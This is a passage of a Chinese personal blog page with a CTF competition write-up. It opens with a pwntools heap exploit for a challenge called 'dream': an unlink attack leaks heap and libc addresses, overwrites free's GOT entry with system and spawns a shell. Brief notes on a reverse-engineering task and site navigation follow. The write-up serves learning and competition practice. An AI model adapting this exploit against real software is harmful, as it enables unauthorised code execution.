+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Which dream would you like to change?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(ind))
+    p<span style="color:#f92672">.</span>sendline(str(content))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_dream</span>(ind):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Which dream would you like to delete?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(ind))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp</span>():
+    heap_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4040a0</span>
+    ptr <span style="color:#f92672">=</span> heap_ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1</span>
+    payload1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x90</span>)<span style="color:#f92672">+</span>p64(ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x18</span>)<span style="color:#f92672">+</span>p64(ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>)
+    payload1 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x98</span><span style="color:#f92672">-</span>len(payload1)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>)
+    payload1 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x90</span>)
+    new_dream(<span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#75715e"># 0</span>
+    new_dream(<span style="color:#ae81ff">0x98</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#75715e"># 1</span>
+    new_dream(<span style="color:#ae81ff">0x4f0</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#75715e"># 2</span>
+    new_dream(<span style="color:#ae81ff">0x7</span>, <span style="color:#e6db74">&#39;/bin/s&#39;</span>) <span style="color:#75715e"># 3</span>
+    new_dream(<span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># 4</span>
+    <span style="color:#75715e"># unlink</span>
+    edit_dream(<span style="color:#ae81ff">1</span>, payload1)
+    delete_dream(<span style="color:#ae81ff">2</span>)
+
+    <span style="color:#75715e"># leak</span>
+    edit_dream(<span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x4040a0</span>))
+    read_dream(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)
+    heap_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Do&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;dream 0 addr: &#34;</span><span style="color:#f92672">+</span> hex(heap_addr))
+    edit_dream(<span style="color:#ae81ff">1</span>, p64(heap_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x90</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span>))
+    read_dream(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)
+    unsorted_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Do&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+    libc_base <span style="color:#f92672">=</span> unsorted_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x219cc0</span>
+    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;libc base: &#34;</span><span style="color:#f92672">+</span>hex(libc_base))
+
+    <span style="color:#75715e"># write free got</span>
+    dream4_addr <span style="color:#f92672">=</span> heap_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x90</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0xa0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x500</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span>
+    free_hook <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__malloc_initialize_hook&#39;</span>]<span style="color:#f92672">+</span>libc_base
+    <span style="color:#75715e"># free_hook = elf.got[&#39;free&#39;]</span>
+    sys_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]<span style="color:#f92672">+</span>libc_base
+    one_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xeacf2</span><span style="color:#f92672">+</span> libc_base
+    edit_dream(<span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(free_hook)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;free&#39;</span>])<span style="color:#f92672">+</span>p64(dream4_addr))
+    <span style="color:#75715e"># p.interactive()</span>
+    edit_dream(<span style="color:#ae81ff">3</span>, p64(sys_addr)[:<span style="color:#ae81ff">7</span>])
+    <span style="color:#75715e"># p.interactive()</span>
+    delete_dream(<span style="color:#ae81ff">4</span>)
+    p<span style="color:#f92672">.</span>interactive()
+
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    exp()</code></pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-9" class="outline-2">
+<h2 id="headline-9">
+rev
+</h2>
+<div id="outline-text-headline-9" class="outline-text-2">
+<div id="outline-container-headline-10" class="outline-3">
+<h3 id="headline-10">
+checkin
+</h3>
+<div id="outline-text-headline-10" class="outline-text-3">
+<p>简单的置换+异或。反向做一下就出来了。注意输入的时候scanf的格式，和小端序。</p>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-11" class="outline-2">
+<h2 id="headline-11">
+misc
+</h2>
+<div id="outline-text-headline-11" class="outline-text-2">
+<p>只做了签到和问卷，太丢人了。。。</p>
+</div>
+</div>
+</article>
+    </section>
+
+    <footer class="ui attached segment dream-tags" data-html2canvas-ignore>
+      
+          <a class="ui label">No Tags</a>
+      
+      <div
+        class="ui label"
+        style="float: right; cursor: pointer;"
+        onclick="savePostAsImg()">
+        <i class="save icon"></i>Save as image
+      </div>
+    </footer>
+
+    
+
+    
+    
+    
+
+    
+
+  </div>
+  <aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
+    
+    
+      <div class="ui segment toc">
+        <nav id="TableOfContents">
+<ul>
+<li><a href="#headline-1">crypto</a>
+<ul>
+<li><a href="#headline-2">ez game</a>
+</li>
+<li><a href="#headline-3">pow</a>
+</li>
+</ul>
+</li>
+<li><a href="#headline-4">pwn</a>
+<ul>
+<li><a href="#headline-5">math</a>
+</li>
+<li><a href="#headline-6">oj &amp; oj_revenge</a>
+</li>
+<li><a href="#headline-7">拿到shell是一件很嘻哈的事</a>
+</li>
+<li><a href="#headline-8">dream</a>
+</li>
+</ul>
+</li>
+<li><a href="#headline-9">rev</a>
+<ul>
+<li><a href="#headline-10">checkin</a>
+</li>
+</ul>
+</li>
+<li><a href="#headline-11">misc</a>
+</li>
+</ul>
+</nav>
+      </div>
+    
+
+    <article class="dream-header">
+  <section class="ui top attached center aligned segment">
+    <div class="ui small circular image">
+      
+        <img src="/img/avatar.png">
+      
+    </div>
+
+    
+    <h1 class="ui medium header">
+    
+      Iluvata&#39;s blog
+      <div class="sub header" style="margin-top: 0.5rem;">shine on you crazy diamond</div>
+    
+    </h1>
+    
+
+    <div class="ui horizontal list">
+      
+      <a class="item" href="/tags">
+        <i class="tags icon" title="All Tags"></i>
+      </a>
+      <a class="item" href="/categories">
+        <i class="th list icon" title="All Categories"></i>
+      </a>
+    </div>
+  </section>
+
+  
+  <section class="ui attached center aligned segment dream-tags">
+    
+      
+      
+      <a class="ui label" href="/tags/algorithm/" title="Algorithm">
+        Algorithm
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/ctf/" title="Ctf">
+        Ctf
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/emacs/" title="Emacs">
+        Emacs
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/hugo/" title="Hugo">
+        Hugo
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/information/" title="Information">
+        Information
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/math/" title="Math">
+        Math
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/operating-system/" title="Operating System">
+        Operating System
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/pwn/" title="Pwn">
+        Pwn
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/sicp/" title="Sicp">
+        Sicp
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/web/" title="Web">
+        Web
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/work/" title="Work">
+        Work
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/%E8%80%83%E7%A0%94/" title="考研">
+        考研
+      </a>
+    
+  </section>
+  
+
+  
+  <section class="ui attached segment dream-categories">
+    <div class="ui accordion">
+      
+      
+      
+      
+      
+
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            
+            
+            <a class="item" href="/categories/learning/" title="Learning">
+              Learning
+            </a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-12-28_hugo-with-latex/">在hugo中使用latex</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-12-28_structural-information/">结构信息论</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-12-28_n1book-web/">N1Book Web 学习</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-12-23_heap/">pwn堆题整理</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-11-13_rop/">ROP</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-11-10_ctf-libc-leak/">libc泄漏</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-09-24_ctf-tools/">CTF基本工具使用指北</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-04-07_iteration-and-recurtion/">迭代与递归</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-19_distributions/">概率统计中的分布</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-15_computer-structure/">计算机体系结构与组成原理</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-14_basic-elements-for-programming-language/">编程语言的基本组成</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-09_file-and-database/">文件系统与数据库系统</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-04_euler-circuit-and-hamiltonian-circuit/">欧拉环路和汉密尔顿环路</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-01_how-computer-startup/">电脑是怎么启动的</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-24_greedy-and-dijkstra/">理解贪心算法与Dijkstra算法</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-19_dp-and-warshall/">理解动态规划与warshall算法</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            
+            
+            <a class="item" href="/categories/life/" title="Life">
+              Life
+            </a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-04-19_likehood-reasoning/">最大似然估计与基本演绎法</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-22_latex-with-emacs/">在org mode中嵌入latex</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-16_yearly-review/">2020年度回顾以及新年目标</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-02_scheme-in-emacs/">在spacemacs中写scheme</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-02_hugo-with-emacs/">用easy-hugo在spacemacs中写hugo博客</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-01-27_hugo-config/">hugo 博客配置</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+
+      
+    </div>
+  </section>
+  
+
+  <section class="ui attached segment header-socials">
+    <nav class="ui secondary menu dream-menu dream-socials">
+  
+  
+    <div class="item">
+      <a href="mailto:dyhdjyc@gmail.com">
+        <i class=" mail icon" title="Email"></i>
+      </a>
+    </div>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</nav>
+
+  </section>
+
+  <section class="ui bottom attached center aligned segment">
+    
+      <p>© 2021 - 2022 Iluvata&#39;s Blog</p>
+    
+
+    <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+    
+  </section>
+</article>
+
+  </aside>
+</div>
+
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <div class="ui centered relaxed grid dream-grid dream-back">
+  
+  
+  
+
+  <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article>
+      <div class="ui top attached segment">
+        <h3 class="ui header">Social Links</h3>
+      </div>
+      <div class="ui bottom attached segment">
+        <nav class="ui secondary menu dream-menu dream-socials">
+  
+  
+    <div class="item">
+      <a href="mailto:dyhdjyc@gmail.com">
+        <i class="large mail icon" title="Email"></i>
+      </a>
+    </div>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</nav>
+
+      </div>
+    </article>
+  </section>
+
+  <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+  </section>
+
+  
+    
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script>
+  window.defaultDark =  null 
+  window.backgroundDark =  null 
+  window.backgroundImageDark =  null 
+  window.darkNav =  true 
+  window.hasTwitterEmbed =  null 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="/js/jquery.min.js"></script>
+<script src="/js/semantic.min.js"></script>
+<script src="/js/jquery.overlayScrollbars.min.js"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+<script src="/js/html2canvas.min.js"></script>
+<script src="/js/post.js"></script>
+
+
+
+
+
+    
+
+    
+  </body>
+</html>
